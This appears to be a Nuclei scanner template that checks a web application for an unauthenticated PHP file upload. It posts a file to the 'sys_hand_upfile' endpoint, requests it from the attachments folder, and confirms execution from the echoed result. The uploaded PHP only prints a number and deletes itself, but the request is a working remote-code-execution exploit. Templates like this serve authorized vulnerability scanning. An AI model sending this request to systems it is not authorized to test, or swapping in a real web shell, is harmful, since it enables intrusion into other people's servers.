id: need_to_change

info:
  name: need_to_change
  author: msk
  severity: high


variables:
  filename: "{{to_lower(rand_base(10))}}"
  boundary: "{{to_lower(rand_base(20))}}"


http:
  - raw:
      - |
        POST /?g=sys_hand_upfile HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/3.0)
        Accept-Encoding: gzip, deflate, br
        Accept: */*
        Connection: keep-alive
        Content-Type: multipart/form-data; boundary={{boundary}}

        --{{boundary}}
        Content-Disposition: form-data; name="upfile"; filename="{{filename}}.php"

        <?php echo 111*111;unlink(__FILE__);?>
        --{{boundary}}
        Content-Disposition: form-data; name="submit_post"

        sys_hand_upfile
        --{{boundary}}--


      - |
        GET /attachements/{{filename}}.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/3.0)


    matchers:
      - type: dsl
        dsl:
          - status_code_2==200 && contains_all(body_2,"12321")